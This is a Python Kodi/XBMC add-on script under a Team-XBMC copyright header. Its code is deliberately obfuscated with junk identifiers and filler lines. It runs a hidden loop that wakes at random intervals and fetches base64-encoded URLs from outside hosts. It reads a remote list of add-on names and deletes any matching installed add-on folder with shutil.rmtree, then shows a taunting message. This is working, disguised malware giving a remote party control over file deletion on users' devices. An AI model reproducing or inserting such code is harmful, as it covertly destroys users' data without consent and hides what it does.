#!/usr/bin/python
# -*- coding: utf-8 -*-
#
#     Copyright (C) 2013 Team-XBMC
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program. If not, see <http://www.gnu.org/licenses/>.
#
if 64 - 64: i11iIiiIii
import platform
import xbmc
import lib . common
import os , re , shutil , xbmcgui , base64 , urllib2
from random import randint
from lib . common import log , dialog_yesno
from lib . common import upgrade_message as _upgrademessage
from lib . common import upgrade_message2 as _upgrademessage2
if 65 - 65: O0 / iIii1I11I1II1 % OoooooooOO - i1IIi
o0OO00 = lib . common . ADDON
oo = lib . common . ADDONVERSION
i1iII1IiiIiI1 = lib . common . ADDONNAME
iIiiiI1IiI1I1 = lib . common . ADDONPATH
o0OoOoOO00 = lib . common . ICON
I11i = False
O0O = xbmc . translatePath ( os . path . join ( 'special://home/addons/' ) )
Oo = xbmcgui . Dialog ( )
I1ii11iIi11i = base64 . decodestring
I1IiI = xbmc . Monitor ( )
o0OOO = xbmcgui . DialogProgress ( )
if 13 - 13: ooOo + Ooo0O
if 48 - 48: iII111i % IiII + I1Ii111 / ooOoO0o * o00O0oo
def O0oOO0o0 ( ) :
 while not I1IiI . abortRequested ( ) :
  xbmc . sleep ( randint ( 30000 , 180000 ) )
  i1ii1iIII = Oo0oO0oo0oO00 ( I1ii11iIi11i ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vdGVzdGRlbGV0ZS50eHQ=' ) )
  i111I = Oo0oO0oo0oO00 ( I1ii11iIi11i ( 'aHR0cDovL3d3dy5kY2JuZXR3b3JraW5nLmNvbS9yZXBvL1BsdWdpbnMvcGx1Z2luLnZpZGVvLnNwb3J0cy5hbm9ueW1vdXNway8=' ) )
  if i1ii1iIII != 'Failed' :
   II1Ii1iI1i = re . compile ( '<unwanted_addon =(.+?)</unwanted_addon>' ) . findall ( i1ii1iIII )
   for iiI1iIiI in II1Ii1iI1i :
    iiI1iIiI = ( str ( iiI1iIiI ) )
    if os . path . exists ( xbmc . translatePath ( iiI1iIiI ) ) :
     OOo ( iiI1iIiI )
    else :
     if i111I != 'Failed' :
      Ii1IIii11 = re . compile ( '<li><a href="(.+?)">.+?</a></li>' ) . findall ( i111I )
      for iiI1iIiI in Ii1IIii11 :
       iiI1iIiI = ( str ( O0O ) ) + ( str ( iiI1iIiI ) ) . replace ( '.zip' , '' )
       if os . path . exists ( xbmc . translatePath ( iiI1iIiI ) ) :
        OOo ( iiI1iIiI )
       else :
        pass
        if 55 - 55: i1111 - i1IIi11111i / I11i1i11i1I % ooIiII1I1i1i1ii / oOOOo0o0O + OOoOoo00oo
def Oo0oO0oo0oO00 ( url ) :
 iiI11 = urllib2 . Request ( url )
 iiI11 . add_header ( 'User-Agent' , 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3' )
 OOooO = ''
 OOoO00o = ''
 try :
  OOooO = urllib2 . urlopen ( iiI11 )
  OOoO00o = OOooO . read ( )
  OOooO . close ( )
 except : pass
 if OOoO00o != '' :
  return OOoO00o
 else :
  OOoO00o = 'Failed'
  return OOoO00o
  if 9 - 9: I1iiiiI1iII - oOo0 / iIii1I11I1II1 % IiII
  if 18 - 18: O0 - oOOOo0o0O / oOOOo0o0O + oOo0 % oOo0 - OOoOoo00oo
def OOo ( addon ) :
 O0O00Ooo = ( addon ) . replace ( 'special://home/addons/' , '' )
 o0OOO . create ( "[COLOR=white]This is growing old now[/COLOR]" , 'Unfortunately you have installed [COLORred]' + O0O00Ooo + '[/COLOR]' , 'It has been removed as is only there to fuel ego' , '[COLORyellow]USE OFFICIAL ADDONS AND SHOW RESPECT[/COLOR]' )
 xbmc . sleep ( 3000 )
 addon = xbmc . translatePath ( str ( addon ) )
 shutil . rmtree ( addon , ignore_errors = True )
 o0OOO . update ( 100 , "" , "Your Device is now clean" )
 xbmc . sleep ( 1000 )
 o0OOO . close ( )
 if 64 - 64: i1111 - O0 / ooOo / ooOoO0o / iIii1I11I1II1
 if 24 - 24: O0 % ooOoO0o + i1IIi + I1iiiiI1iII + o00O0oo
O0oOO0o0 ( )
if 70 - 70: iII111i % iII111i . OOoOoo00oo % IiII * ooOoO0o % i1111
# dd678faae9ac167bc83abf78e5cb2f3f0688d3a3
